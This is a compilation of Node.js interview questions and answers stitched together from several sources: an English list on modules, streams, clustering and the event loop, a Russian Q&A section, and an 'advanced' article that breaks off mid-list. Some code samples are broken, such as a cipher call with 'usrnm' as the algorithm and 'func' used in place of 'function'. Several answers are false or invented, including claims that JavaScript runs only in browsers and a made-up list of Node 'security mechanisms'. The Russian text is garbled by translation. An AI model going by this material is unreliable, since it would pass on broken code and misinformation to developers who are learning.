Note: The path module simply manipulates strings and does not interact with the file system to validate the paths.

28. What is the File System module in Node.js?
Node.js provides a file system module (fs) to perform file I/O and directory I/O operations.
The fs module provides both asynchronous and synchronous ways to perform file I/O and directory I/O operations.
The synchronous functions have the “Sync” word as a suffix with their names and return the value directly.
In synchronous file I/O operation, Node doesn’t execute any other code while the I/O is being performed.
By default, fs module functions are asynchronous, which means they return the output of the I/O operation as a parameter to a callback function.
29. What are the differences between Angular and Node.js?
The differences between Angular and Node.js are:

Factor	Angular	Node.js
Definition	A front-end framework for building web applications.	A back-end runtime for running JavaScript on the server.
Usage	Used for designing the user interface and handling user interactions.	Used for handling server-side logic, databases, and APIs.
Language	Based on TypeScript, a superset of JavaScript.	Uses JavaScript and runs on the V8 engine.
Working Area	Works in the browser (client-side).	Works on the server (server-side).
Example Use	Creating dynamic web pages and single-page applications (SPAs).	Building APIs, web servers, and real-time applications.
Both Angular and Node.js are important in web development but serve different purposes!

30. Which types of network applications can you build using Node.js?
Node.js is best for developing the HTTP-based application. But it is not only for developing the HTTP-based application. It can be used to develop other types of applications. Like as:

TCP Server
Command-line program
Real-time web application
Email server
File server
Proxy server
31. Which database is most commonly used with Node.js?
MongoDB is the most popular database used with Node.js because it is fast, scalable, and works well with JavaScript. It is a NoSQL database, meaning it stores data in a flexible JSON-like format, making it easy to use with Node.js applications.

Read More: What is MongoDB, and why should you use it?

32. What are the most popular libraries used in Node.js?
Many libraries make Node.js development easier and more efficient. Some of the most commonly used ones are:

Express.js – A fast and lightweight web framework for building APIs and web applications.
Mongoose – A library for working with MongoDB databases in an easy way.
Lodash – Provides useful functions for working with arrays, objects, and strings.
Axios – A popular library for making HTTP requests to APIs.
Socket.io – Helps in building real-time applications like chat apps.
These libraries help developers build powerful Node.js applications quickly and efficiently!

33. What are Node.js Http module limitations?
The Node.js HTTP module has the following limitations:

No cookie handling or parsing
No built-in session support
No built-in routing support
No static file serving
34. What is socket.io?
Socket.io is the most popular node.js module for WebSockets programming. It is used for two-way communication on the web. It uses events for transmitting and receiving messages between client and server.

Socket.io logo
socket.emit("eventname",data) event is used for sending messages. socket.on("eventname",callback) event is used for receiving messages.

35. What are various Node.js web development frameworks?
The best and most powerful Node.js web development frameworks to build real-time and scalable web applications with ease are given below:

MVC Frameworks
Express
Koa
Hapi
Sails
Nodal
Full-stack frameworks
Meteor
Derby.js
MEAN.IO
MEAN.js
Keystone
Horizon
36. What are various Node.js REST API frameworks?
The best and most powerful Node.js REST API frameworks to build a fast Node.js REST API server with ease are given below:

Restify
LoopBack
ActionHero
Fortune.js
37. How will you use the URL module in Node.js?
The URL module in Node.js helps in working with web addresses (URLs). It allows us to break down, read, and manipulate URLs easily.

Steps to Use the URL Module
Import the URL module using require('url').
Parse a URL to get details like hostname, pathname, and query parameters.
Format or modify a URL if needed.
38. What is NPM?
NPM stands for Node Package Manager and is responsible for managing all the packages and modules for Node.js.

Node Package Manager provides two main functionalities:
Provides online repositories for node.js packages/modules, which are searchable on search.nodejs.org
Provides command-line utility to install Node.js packages and also manages Node.js versions and dependencies
39. Why is Node.js preferred over other backend technologies like Java and PHP?
Some of the reasons why Node.js is preferred are as follows:

Node.js is very fast
Node Package Manager has over 50,000 bundles available at the developer’s disposal.
Perfect for data-intensive, real-time web applications, as Node.js never waits for an API to return data.
Better synchronization of code between server and client due to the same code base
Easy for web developers to start using Node.js in their projects as it is a JavaScript library
40. Explain the control flow function.
The control flow function is the sequence in which statements or functions are executed. Since I/O operations are non-blocking in Node.js, control flow cannot be linear. Therefore, it registers a callback to the event loop and passes the control back to the node, so that the next lines of code can run without interruption.

Example
[code language="javascript"]
fs.readFile('/root/text.txt', func(err, data){
console.log(data);
});
console.log("This is displayed first");
[/code]   
In this, the readFile operation will take some time; however, the next console.log is not blocked. Once the operation completes, you’ll see the displayed data.

41. Explain Node.js web application architecture.
A web application is distinguished into four layers:

Client Layer: The Client layer contains web browsers, mobile browsers, or applications that can make an HTTP request to the web server.
Server Layer: The Server layer contains the Web server which can intercept the requests made by clients and pass them the response.
Business Layer: The business layer contains an application server which is utilized by the web server to do required processing. This layer interacts with the data layer via a database or some external programs.
Data Layer: The Data layer contains databases or any source of data.
Read More: Exploring Node.js Architecture

42. Why is assert used in Node.js?
Assert is used to write test cases explicitly to verify the working of a piece of code. The following code snippet denotes the usage of assert:

Example
var assert = require('assert');
function add(x, y) {
return x + y;
}
var result = add(3,5);
assert( result === 8, 'three summed with five is eight');    
43. What is clustering in Node.js, and how does it work?
Clustering is a technique in Node.js that allows you to create a cluster of worker processes that can share a single port and handle incoming requests in parallel.This can help improve the performance and scalability of your Node.js applications.In a typical Node.js application, there is a single process that handles all incoming requests.This process runs on a single CPU core and can become a bottleneck as the number of requests increases.

With clustering, you can create multiple worker processes that can handle requests in parallel, spreading the load across multiple CPU cores.
Clustering works by using the built-in cluster module in Node.js.
This module allows you to create a master process that manages a cluster of worker processes.
The master process listens for incoming requests and distributes them to the worker processes in a round-robin fashion.
Each worker process runs a copy of your application code and handles incoming requests independently.
Example
const cluster = require('cluster');
const http = require('http');
const numCPUs = require('os').cpus().length;
if (cluster.isMaster) {
  console.log(`Master ${process.pid} is running`);
  // Fork worker processes
  for (let i = 0; i < numCPUs; i++) {
    cluster.fork();
  }
  cluster.on('exit', (worker, code, signal) => {
    console.log(`Worker ${worker.process.pid} died`);
    // Replace the dead worker
    cluster.fork();
  });
} else {
  // Worker process runs the server
  http.createServer((req, res) => {
    res.writeHead(200);
    res.end('Hello, world!');
  }).listen(8000);
  console.log(`Worker ${process.pid} started`);
}   
Here, we create a master process that forks multiple worker processes. Each worker process runs a copy of the HTTP server, which listens for incoming requests and responds with a “Hello, world!” message. The master process manages the worker processes and replaces any that die unexpectedly.

44. Explain the steps to write an Express JS application.
To set up an ExpressJs application, you need to execute the following steps:

Create a folder with the project name
Create a file named package.json inside the folder
Run the ‘npm install’ command on the command prompt to install the libraries present in the package file\
Create a file named server.js
Create the ‘router’ file inside the package consisting of a folder named index.js
The application is created inside the package containing the index.html file
Read More: Getting Started with ExpressJS

45. What is the crypto module in Node.js? How is it used?
The crypto module in Node.js is used for cryptography, i.e., it includes a set of wrappers for the open SSL's hash, HMAC, sign, decipher, cipher, and verify functions.

Example of using a cipher for encryption
const crypto = require('crypto'); 
const cipher = crypto.createCipher('usrnm', 'pwdd'); 
var encryptd = cipher.update('Welcome to hackr', 'utf8', 'hex'); 
encryptd += cipher.final('hex'); 
console.log(encryptd);   
Example of deciphering to decrypt the above
const crypto = require('crypto'); 
const decipher = crypto.createDecipher('usrnm', 'pwdd'); 
var encryptd = ''; 
var decryptd = decipher.update(encryptd, 'hex', 'utf8'); 
decryptd += decipher.final('utf8'); 
console.log(decryptd); 
Node.js Interview Questions and Answers for Experienced
Let's discuss the most important Node.js interview questions and answers for experienced.

46. Explain the security mechanism of Node.js.
The security mechanisms are:

Authorization codes: Authorization codes help secure Node.js from unauthorized third parties. Anyone who wants to access Node.js goes through the GET request of the resource provider's network.
Certified Modules: Certification modules are like filters that scan the libraries of Node.js to identify if any third-party code is present or not. Any hacking can be detected using certifications.
Curated Screening Register: This is a quality control system where all the packages (code and software) are checked to ensure their safety. This scan helps to eliminate unverified or unreliable libraries getting into your application.
Regular updates: Downloading the newest version of Node.js will prevent potential hackers and attacks.
47. What tools can be used to ensure a consistent style in Node.js?
Following is a list of tools that can be used in developing code in teams, to enforce a given style guide and to catch common errors using static analysis.

JSLint
JSHint
ESLint
JSCS
48. Explain the difference between setImmediate() vs setTimeout().
While the word immediately is slightly misleading, the callback happens only after the I/O events callbacks. When we call setImmediate(). setTimeout() is used to set a delay (in milliseconds) for the execution of a one-time callback. If we execute:

setImmediate(function() {
console.log('setImmediate')
})
setTimeout(function() {
console.log('setTimeout')
}, 0)  
We will get the output as “setTimeOut” and then “setImmediate.”

49. Write a function that takes an array of numbers as input and returns a new array containing only the even numbers.
function filterEvenNumbers(array) {
  return array.filter(num => num % 2 === 0);
}  
50. What is Punycode?
Punycode is an encoding syntax in Node.js that helps convert the Unicode string of characters into ASCII. This is done as the hostnames can only comprehend ASCII codes and not Unicode. While it was bundled up within the default package in recent versions, you can use it in the previous version using the following code:

punycode = require(‘punycode’);   
51. What is piping in Node.js?
Piping is a technique for streaming data between two or more streams, such as reading from a file and writing to a network socket, or reading from one network connection and writing to another. This technique allows you to easily connect streams and transfer data efficiently, without having to manually manage the data transfer or buffer the data in memory.

The pipe() method takes a destination stream as its argument and returns the destination stream, allowing you to chain multiple pipe() calls together:

const fs = require('fs');
const http = require('http');
const server = http.createServer((req, res) => {
  const fileStream = fs.createReadStream('largefile.txt');
  fileStream.pipe(res);
});
server.listen(3000);  
In the above code, we create an HTTP server that listens on port 3000. When a client requests the server, we create a new readable stream from a file called largefile.txt and pipe the data to the response stream using the pipe() method.

52. What is the framework that is used most often in Node.js today?
Node.js has multiple frameworks

Hapi.js
Express.js
Sails.js
Meteor.js
Derby.js
Adonis.js
Among these, the most used framework is Express.js for its ability to provide good scalability, flexibility, and minimalism.

53. What are streams in Node.js, and how are they useful?
Streams in Node.js are a way of handling data continuously and efficiently. Streams allow you to read or write data piece by piece, rather than all at once, which can be useful for handling large files or data sets. They also allow you to process data in real-time, as it becomes available, which can be useful for network programming, data processing, and other applications.

Types of Streams in Node.js
There are four types of streams in Node.js:

Readable streams: allow you to read data, piece by piece.
Writable streams: allow you to write data, piece by piece.
Duplex streamscan be both readable and writable.
Transform streams: can transform data as it passes through.
Example
const fs = require('fs');
const readStream = fs.createReadStream('largefile.txt');
readStream.on('data', (chunk) => {
  console.log(`Received ${chunk.length} bytes of data`);
});
readStream.on('end', () => {
  console.log('Finished reading file');
});
readStream.on('error', (err) => {
  console.error('Error:', err);
});    
In the above example, we use the fs.createReadStream() method to create a readable stream for a large file and listen for the data, end, and error events.

54. What is a memory leak in Node.js? How do you detect and prevent it?
A memory leak is a type of bug that occurs when an application unintentionally retains memory that it no longer needs, rather than releasing it back to the system.

Reasons behind memory leak
Unintentional retention of objects in memory
Circular references that prevent objects from being garbage-collected
Use of memory-intensive libraries or data structures
Ways to Detect and Prevent Memory Leaks in NodeJS
Monitoring memory usage: It is one of the simplest ways to detect a memory leak. You just need to monitor the memory usage of a Node.js application over time. If memory usage consistently increases over time, it may be an indication of a memory leak.
Profiling tools: Node.js provides a built-in profiler that can be used to identify areas of an application that are using an excessive amount of memory. Other profiling tools, such as Chrome DevTools or Node Inspector, can also be used to identify memory leaks.
Garbage collection tuning: This can help reduce the likelihood of memory leaks. For example, increasing the heap size can help reduce the frequency of garbage collection and the likelihood of garbage collection pauses.
Code review: Reviewing application code can help identify areas where memory leaks may occur. NodeJS best practices, such as avoiding circular references, freeing resources when they are no longer needed, and avoiding unnecessary object creation, can help reduce the likelihood of memory leaks.
55. Explain to me why Node.js is single-threaded.
Node.js works on the single-threaded model to ensure that there is support for asynchronous processing. With this, it makes it scalable and efficient for applications to provide high performance and efficiency under high amounts of load.

56. Explain the various types of API functions in Node.js.
The two types of API functions in Node.js are:

Asynchronous/Non-blocking: These requests do not wait for the server to respond. They continue to process the next request, and once the response is received, they receive the same.
Synchronous/Blocking: These are requests that block any other requests. Once the request is completed, only then is the next one taken up.
57. Explain middleware in Node.js.
Middleware is a function that receives the request and response objects. Most tasks that the middleware functions perform are:

Execute any code
Update or modify the request and the response objects
Finish the request-response cycle
Invoke the next middleware in the stack
58. Explain LTS releases of Node.js.
LTS or Long-Term Support is applied to release lines supported and maintained by the Node.js project for an extended period.

There are two types of LTS:

Active, which is actively maintained and upgraded
Maintenance line nearing the end of the line and maintained for a short period.
59. What are the main differences between Node.js and Javascript?
The main differences between Node.js and Javascript:

Node.js	JavaScript
Cross-platform open-source JS runtime engine.	A high-level scripting language based on the concept of OOPS.
The code can be run outside the browser.	The code can run only in the browser.
Used on server-side.	Used on the client-side.
No capabilities to add HTML tags.	Can add HTML tags.
It can be run only on Google Chrome's V8 engine.	It can be run on any browser.
Written in C++ and JavaScript.	An upgraded version of ECMA script written in C++.
60. How is Node.js better than other frameworks?
Node.js is a server-side JavaScript runtime environment built on top of the V8 JavaScript engine, the same engine that powers Google Chrome. It makes Node.js very fast and efficient, as well as highly scalable.

61. Differentiate spawn() and fork() methods in Node.js
spawn()	fork()
Designed to run system commands.	A special instance of spawn() that runs a new instance of V8.
Does not execute any other code within the node process.	Can create multiple workers that run on the same Node codebase.
child_process.spawn(command[, args][, options]) creates a new process with the given command.	A special case of spawn() to create child processes using. child_process.fork(modulePath[, args][, options])
Creates a streaming interface (data buffering in binary format) between parent and child process.	Creates a communication (messaging) channel between parent and child process.
It is more useful for continuous operations like data streaming (read/write). For example, streaming images/files from the spawn process to the parent process.	More useful for messaging. For example, JSON or XML data messaging.
62. What is an event loop in Node.js?
The event loop is a core concept in Node.js that enables it to handle many concurrent connections with low overhead.
It is a loop that continuously checks for new events and executes the associated callbacks when events are detected.
In Node.js, when a client sends a request to a server, the server creates an event associated with that request and adds it to the event loop.
The event loop continuously checks for new events, and when an event is detected, it dispatches the associated callback function to handle the event.
63. What is the default scope in the Node.js application?
The module scope is the default scope in Node.JS.

64. Is Node.js the best platform for CPU-heavy applications?
CPU-incentive applications are not a strong suit of Node.js. The CPU-heavy operations block incoming requests and push the thread into critical situations.

65. What is an error-first callback?
Error-first callbacks are used to pass errors and data. If something goes wrong, the programmer has to check the first argument because it is always an error argument. Additional arguments are used to pass data.

fs.readFile(filePath, function(err, data) {    
  if (err) {  
    //handle the error  
  }  
  // use the data object  
});    
66. Why must the express “app” and “server” be separated?
If we keep the app and server functionalities separate, the code can be divided into multiple modules, which reduces the dependency between modules. Each module will perform a single task. Finally, the separation of logic helps avoid duplicate code.

67. What is EventEmitter in Node.js?
A fundamental module in Node.js called EventEmitter.
It enables objects to talk to one another by sending out events and receiving them back.
It offers a method for managing callbacks and asynchronous events.
It is possible to design unique events and bind listeners to them.
        
const EventEmitter = require('events');
const myEmitter = new EventEmitter();

myEmitter.on('event', () => {
  console.log('An event occurred!');
});
myEmitter.emit('event');
68. How does Node.js handle concurrency?
Node.js uses an event-driven, non-blocking I/O architecture to manage concurrency.
In order to handle several concurrent operations, it employs a single-threaded event loop.
Because of this, Node.js can manage thousands of connections at once without launching numerous threads.
69. What is the purpose of the package.json file?
Any Node.js project's core is its package.json file.
The project's name, version, description, primary entry point, scripts, dependencies, devDependencies, and other information are all contained in it.
Npm uses it for installing and maintaining dependencies.
70. How can you handle errors in Node.js?
Here, Try-catch blocks for synchronous code and error-first callbacks or promises for asynchronous code are two ways that Node.js handles errors.
        
// Synchronous error handling
try {
  let data = fs.readFileSync('file.txt');
} catch (error) {
  console.error('Error reading file:', error);
}

// Asynchronous error handling with callbacks
fs.readFile('file.txt', (err, data) => {
  if (err) {
    console.error('Error reading file:', err);
    return;
  }
  console.log('File data:', data);
});
71. What is the purpose of the Node.js cluster module?
Node.js's cluster module is used to construct workers, or child processes, that share a server port. By spreading the load across several CPU cores, this allows the program to take advantage of multi-core platforms, which enhances performance and scalability.
72. What is middleware in Express.js?
A function that may access the request object (req), the response object (res), and the subsequent middleware function in the request-response cycle of the application is referred to as middleware in Express.js. In addition to executing code, middleware functions can also modify request and response objects, call the subsequent middleware function, and break the request-response cycle.
73.What is the difference between process.nextTick() and setImmediate() in Node.js?
The procedure.nextTick() plans a callback to be executed before to any I/O operations during the subsequent event loop iteration. however, after I/O operations, Immediate() plans a callback to be executed in the subsequent iteration of the event loop.
74. What is callback hell, and how can you avoid it?
Callback hell, also known as the "Pyramid of Doom,".It occurs when there are multiple nested callbacks, making the code difficult to read and maintain. It can be avoided by using:
Promises
Async/await
Modularizing the code into smaller functions
75. What is the difference between CommonJS and ES6 modules?
Node.js uses the CommonJS module system, which makes use of require and module.exports. In contemporary ECMAScript, ES6 modules are the standard for JavaScript modules and employ import and export syntax. Although both are supported by Node.js, ES6 modules are recommended due to their compatibility and contemporary capabilities.
76. How can you ensure security in a Node.js application?
To ensure security in a Node.js application, we should:

Applying safe coding techniques
Verifying and cleaning user input
Implementing in place suitable authorization and authentication systems
Frequently upgrading dependencies while using HTTPS
Setting HTTP headers with security-focused tools such as Helmet
77. How will you use async await in node.js?
In Node.js, async/await is used to handle asynchronous operations in a simple and readable way. The async keyword is used before a function to make it return a promise, and await pauses the execution until the promise is resolved. This helps avoid callback hell and makes code easier to understand. For example, when fetching data from a database or an API, async/await ensures smooth execution without blocking the event loop

78. Describe how you separate the Express app and server.
In Node.js, separating the Express app and server improves code organization and maintainability.

The Express app handles routes, middleware, and logic, while the server file starts the server and listens for requests.
We create an app.js file to define the Express application and export it, then a server.js file to import the app and run it using HTTP methods.
This structure makes testing, scaling, and modifying the application easier, ensuring a clean and modular Node.js Express application.
79. Describe passport in Node.js?
Passport is a popular authentication middleware for Node.js that helps handle user logins securely. It supports different authentication methods like local authentication (username & password) and third-party logins such as Google, Facebook, and GitHub.
It is lightweight, flexible, and easy to integrate with frameworks like Express.js. Developers use Passport to manage user authentication without writing complex logic, making it a key tool in Node.js applications.
80. How is the Crypto Module Used in Node.js?
The Crypto module in Node.js is used for securing data by performing encryption, decryption, hashing, and generating secure tokens. It helps in password hashing, data encryption, and creating digital signatures to protect sensitive information. Developers use it to enhance security in applications, especially for handling user authentication and secure transactions.

81. How to Retrieve File Information in Node.js?
In Node.js, you can get details about a file using the fs module (File System module). The fs.stat() method provides information like file size, creation date, type, and permissions, which is useful in Node.js applications.

82. How Does the DNS Lookup Function Operate in Node.js?
In Node.js, the dns.lookup() function resolves a domain name into an IP address, helping applications connect to websites and servers. It uses the DNS module to perform the lookup efficiently, making network requests faster and more reliable.

83. How Does setImmediate() Differ from setTimeout() in Node.js?
In Node.js, setImmediate() executes a callback immediately after the current event loop phase, while setTimeout() runs the callback after a specified delay. Although both schedule tasks asynchronously, setImmediate() is generally faster because it runs in the next event cycle, whereas setTimeout() waits for the defined time before execution.

Вопросы и ответы на собеседовании по Node js для новичков
1) Что такое node.js?
Node.js — это скрипты на стороне сервера, которые используются для создания масштабируемых программ. Его многочисленные преимущества перед другими серверными языками, главным из которых является неблокирующий ввод-вывод.

2) Как работает node.js?
Node.js работает в среде v8, это виртуальная машина, использующая JavaScript в качестве языка сценариев и обеспечивает высокую производительность за счет неблокируемого ввода-вывода и однопоточного цикла событий.

👉 Бесплатная загрузка PDF-файла: Вопросы и ответы для интервью по Node.js

3) Что вы подразумеваете под термином ввод-вывод?
Ввод-вывод — это сокращение ввода и вывода, и он будет иметь доступ ко всему, что находится за пределами вашего приложения. Он будет загружен в память машины для запуска программы после запуска приложения.

Node.js

4) Что означает программирование, управляемое событиями?
В компьютерном программировании событийно-ориентированное программирование — это парадигма программирования, в которой ход выполнения программы определяется событиями, такими как сообщения от других программ или потоков. Это метод архитектуры приложения, разделенный на два раздела: 1) Выбор событий 2) Обработка событий.

5) Где мы можем использовать node.js?
Node.js можно использовать для следующих целей.

Веб-приложения (особенно веб-приложения реального времени)
Сетевые приложения
Распределенные системы
Приложения общего назначения
6) В чем преимущество использования node.js?
Он обеспечивает простой способ создания масштабируемых сетевых программ.
Обычно быстро
Отличный параллелизм
Асинхронное все
Почти никогда не блокируется
7) Каковы два типа функций API в Node.js?
Два типа функций API в Node.js:

Асинхронные неблокирующие функции
Syncхронические, блокирующие функции
8) Что такое функция потока управления?
Общий фрагмент кода, который выполняется между несколькими вызовами асинхронных функций, известен как функция потока управления.

9) Объясните, как «Поток управления» управляет вызовами функций?
Контролируйте порядок выполнения
Собирать данные
Ограничить параллелизм
Вызов следующего шага программы
10) Почему Node.js однопоточный?
Для асинхронной обработки Node.js был создан явно в качестве эксперимента. Считается, что большей производительности и масштабируемости можно достичь, выполняя асинхронную обработку в одном потоке при типичных веб-загрузках, чем при типичной реализации на основе потоков.

СТАТЬИ ПО ТЕМЕ
Как загрузить и установить Node.js и NPM на Windows
Учебное пособие по Node.js для начинающих
Учебное пособие по GraphQL для начинающих: что такое, возможности и пример
GraphQL против REST – разница между API
Вопросы и ответы на собеседовании по Node js для опытных специалистов
11) Работает ли узел в Windows?
Да, это так. Загрузите установщик MSI с сайта https://nodejs.org/download/

12) Можете ли вы получить доступ к DOM в узле?
Нет, вы не можете получить доступ к DOM в узле.

13) Какие задачи следует выполнять асинхронно с помощью цикла событий?
операции ввода/вывода
Тяжелые вычисления
Все, что требует блокировки
14) Почему node.js быстро привлекает внимание JAVA-программистов?
Node.js быстро привлекает внимание, поскольку это сервер на основе цикла для JavaСкрипт. Node.js дает пользователю возможность писать JavaСкрипт на сервере, который имеет доступ к таким вещам, как стек HTTP, файловый ввод-вывод, TCP и базы данных.

15) Какие два аргумента принимает async.queue?
Два аргумента, которые принимает async.queue

Функция задачи
Значение параллелизма
16) Что такое цикл событий в Node.js?
Для обработки и обработки внешних событий и преобразования их в вызовы обратного вызова используется цикл обработки событий. Итак, при вызовах ввода-вывода node.js может переключаться с одного запроса на другой.

17) Назовите шаги, с помощью которых вы можете выполнить асинхронизацию в Node.js?
Выполнив следующие шаги, вы можете асинхронизировать Node.js.

Функции первого класса
Композиция функций
Счетчики обратного вызова
Циклы событий
18) Каковы плюсы и минусы Node.js?
Плюсы:

Если ваше приложение не требует ресурсоемких вычислений, вы можете встроить его в Javascript сверху вниз, даже до уровня базы данных, если вы используете базу данных объекта хранения JSON, например MongoDB.
Сканеры получают полностью обработанный HTML-ответ, который гораздо более оптимизирован для SEO, чем одностраничное приложение или приложение веб-сокетов, работающее поверх Node.js.
Минусы:

Любые интенсивные вычисления ЦП будут блокировать реакцию node.js, поэтому лучше использовать многопоточную платформу.
Использование реляционной базы данных с Node.js считается менее выгодным.
19) Как Node.js решает проблему блокировки операций ввода-вывода?
Node.js решает эту проблему, помещая в основу модель, основанную на событиях, используя цикл событий вместо потоков.

20) В чем разница между Node.js и Ajax?
Разница между Node.js и Ajax заключается в том, что Ajax (сокращение от Asynchronous JavaСценарий и XML) — это технология на стороне клиента, часто используемая для обновления содержимого страницы без ее обновления. Хотя Node.js является серверной частью Javascriptиспользуется для разработкиping Серверное программное обеспечение. Node.js выполняется не в браузере, а на сервере.

Вопросы для собеседования по Node js для людей с опытом работы более 5 лет
21) Каковы проблемы с Node.js?
Подчеркивая техническую сторону, в Node.js довольно сложно иметь один процесс с одним потоком для масштабирования на многоядерном сервере.

22) Что означает «неблокируемость» в node.js?
В node.js «неблокирующий» означает, что его IO неблокирующий. Node использует «libuv» для обработки своего IO платформенно-независимым способом. В Windows он использует порты завершения, в Unix он использует epoll или kqueue и т. д. Таким образом, он делает неблокирующий запрос и по запросу ставит его в очередь в цикле событий, который вызывает JavaСкрипт «обратный вызов» на главном JavaСкриптовая ветка.

23) Какая команда используется в node.js для импорта внешних библиотек?
Команда «require» используется для импорта внешних библиотек, например, «var http=require («http»)». Это загрузит библиотеку http и один экспортированный объект через переменную http.

24) Укажите фреймворк, который чаще всего используется в node.js?
«Экспресс» — наиболее распространенный фреймворк, используемый в node.js.

25) Что такое «обратный вызов» в node.js?
Функция обратного вызова используется в node.js для обработки нескольких запросов, отправленных на сервер. Например, если у вас есть большой файл, чтение которого серверу займет много времени, и если вы не хотите, чтобы сервер читал этот большой файл во время обработки других запросов, используется функция обратного вызова. Функция обратного вызова позволяет серверу сначала обработать ожидающий запрос и вызвать функцию после его завершения.

Эти вопросы для собеседования также помогут вам в устной речи.

25 Advanced Node.js Backend Interview Questions for Senior Role
June 16, 2025
·
13 min read
Jump to Category
⚡ Event Loop & Asynchronous Operations	️ Architecture & Design Patterns
Performance & Memory Management	️ Security & Error Handling
Event Loop & Asynchronous Operations
1. Explain the different phases of the Node.js Event Loop in detail.
The Node.js event loop consists of several phases that execute in a specific order. The main phases are:

Timers: Executes callbacks scheduled by `setTimeout()` and `setInterval()`.
Pending Callbacks: Executes I/O callbacks deferred to the next loop iteration.
Idle, Prepare: Internal use only.
Poll: Retrieves new I/O events; executes I/O-related callbacks. Most of the application code runs here. If the poll queue is empty, it will block until new events arrive or timers are ready.
Check: Executes callbacks scheduled by `setImmediate()`.
Close Callbacks: Executes close event callbacks, e.g., `socket.on(‘close’, …)`.
Between each phase, Node.js processes the `nextTickQueue` and the microtask queue (Promises).
Read the official Node.js guide on the Event Loop.
2. What’s the difference between `setImmediate()` and `process.nextTick()`?
`process.nextTick()`: Callbacks are executed immediately after the current operation completes, before the event loop proceeds to the next phase. If you recursively call `nextTick`, you can starve the event loop and block I/O.

`setImmediate()`: Callbacks are executed in the “check” phase of the event loop, after the “poll” phase. It allows I/O events to be processed before its callback is executed.

Essentially, `nextTick` runs before the event loop continues, while `setImmediate` queues a callback for a subsequent phase of the event loop.

3. What is the libuv library and what is its role in Node.js?
libuv is a C library that provides the asynchronous, event-driven I/O capabilities for Node.js. It abstracts non-blocking I/O operations across different operating systems. It manages the event loop itself, the thread pool for offloading expensive tasks (like file system access or DNS lookups), and handles all the low-level asynchronous operations that make Node’s single-threaded model efficient.

Visit the official libuv website.
4. How do Promises differ from traditional callbacks?
Promises provide a cleaner, more manageable way to handle asynchronous operations.

Control Flow: Promises avoid “callback hell” by allowing chaining (`.then()`, `.catch()`), which is more readable than nested callbacks.
Error Handling: Promises have a built-in, centralized error handling mechanism (`.catch()`) that can catch errors from any point in the chain. Callbacks require explicit error handling for each step.
State Management: A Promise represents the eventual result of an async operation and has a clear state (pending, fulfilled, or rejected). This makes it easier to reason about the flow of data.
5. What are Worker Threads and when should you use them?
Worker Threads allow you to run JavaScript code in parallel on separate threads, which is ideal for CPU-intensive tasks that would otherwise block the main event loop. Unlike child processes, they can share memory efficiently using `SharedArrayBuffer`. You should use them for tasks like complex calculations, image processing, or heavy data manipulation, but not for I/O-bound operations, which Node.js already handles efficiently.

Read the Worker Threads documentation.
6. What is the purpose of the `async_hooks` module?
The `async_hooks` module provides an API to track the lifetime of asynchronous resources within a Node.js application. It’s a powerful tool for diagnostics and observability, allowing developers to build tools for tracing requests across asynchronous boundaries, monitoring resource usage, or implementing continuation-local storage. It’s a low-level API typically used for building APM (Application Performance Monitoring) tools.

Architecture & Design Patterns
7. Describe a scenario where you would choose a microservices architecture over a monolith. What are the trade-offs?
You’d choose microservices for a large, complex application where teams need to develop and deploy independently. For example, an e-commerce platform could have separate services for users, products, orders, and payments.

Trade-offs:

Pros: Independent scaling, technology diversity, improved fault isolation, easier for large teams to manage.
Cons: Increased operational complexity (deployment, monitoring), network latency between services, challenges with distributed transactions and data consistency.
8. How do you manage environment-specific configurations in a Node.js application?
The best practice is to use environment variables, following the principles of a Twelve-Factor App. Avoid hard-coding configuration in files. Libraries like `dotenv` can load variables from a `.env` file during development, but in production, these variables should be set directly in the deployment environment (e.g., in Docker, Kubernetes, or cloud provider settings). This separates config from code, enhancing security and portability.

9. What is dependency injection and how can it be implemented in Node.js?
Dependency Injection (DI) is a design pattern where a component’s dependencies (like a database service or a logger) are “injected” from an external source rather than created internally. This promotes loose coupling and makes components easier to test, maintain, and reuse.

In Node.js, it can be implemented simply by passing dependencies as function parameters or constructor arguments. For larger applications, DI containers or frameworks like `Awilix`, `InversifyJS`, or NestJS’s built-in DI system can automate this process.

10. Explain how you would implement a graceful shutdown.
A graceful shutdown ensures that the server stops accepting new connections but allows existing requests to finish before the process exits. This is done by listening for termination signals (`SIGINT`, `SIGTERM`).

Listen for signals using `process.on(‘SIGTERM’, …)`.
Inside the signal handler, call `server.close()` on your HTTP server. This stops it from accepting new connections.
Close other resources like database connections.
Set a timeout to force process termination if cleanup takes too long.
Finally, call `process.exit()` once all connections are closed.
11. What is the role of a reverse proxy in a Node.js deployment?
A reverse proxy (like Nginx or HAProxy) sits in front of a Node.js application and forwards client requests to it. It’s crucial for production deployments for several reasons:

Load Balancing: Distributes traffic across multiple Node.js instances.
SSL Termination: Handles HTTPS encryption/decryption, offloading that work from the Node.js process.
Serving Static Content: Can serve static files (CSS, images) more efficiently than Node.js.
Security: Can provide an additional layer of security, hiding the application server and handling things like rate limiting.
Read about Reverse Proxies on MDN.
12. What is long polling and when might it be a better choice than WebSockets?
Long polling is a technique where the client sends a request to the server, and the server holds the connection open until it has new data to send. Once it sends data, the connection is closed, and the client immediately opens a new one.

It might be a better choice than WebSockets in environments with strict firewalls or proxies that don’t support the WebSocket protocol, or for applications that have infrequent but important server-to-client updates. WebSockets are better for high-frequency, low-latency, bi-directional communication.

Performance & Memory Management
13. What is the V8 engine and how does it execute JavaScript?
V8 is Google’s open-source, high-performance JavaScript and WebAssembly engine, written in C++, that powers Node.js. It compiles JavaScript directly to native machine code using a Just-In-Time (JIT) compiler. It initially uses an interpreter (Ignition) to start execution quickly, then its optimizing compiler (TurboFan) identifies “hot” functions and recompiles them into highly optimized machine code for peak performance.

Explore the official V8 documentation.
14. How does garbage collection work in V8, and what can cause memory leaks in Node.js?
V8 uses a generational garbage collector. It divides memory into a “Young Generation” (for new objects) and an “Old Generation.” Objects are first allocated in the Young Generation, which is collected frequently and quickly. Objects that survive multiple collections are promoted to the Old Generation, which is collected less often using a concurrent mark-and-sweep algorithm.

Common causes of memory leaks include:

Global Variables: Accidental globals that are never cleaned up.
Closures: Unmanaged closures holding onto references to large objects.
Event Emitters: Adding listeners to event emitters but never removing them.
Read the V8 blog post on garbage collection.
15. What are Node.js Streams and why are they important for performance?
Streams are collections of data that you can read from or write to sequentially. They are important for performance because they allow you to process large amounts of data in chunks without having to buffer it all in memory. For example, you can pipe a readable stream from a large file directly to a writable stream of an HTTP response, using very little memory. The four types are Readable, Writable, Duplex, and Transform.

Read the official documentation on Streams.
16. What is backpressure in the context of streams?
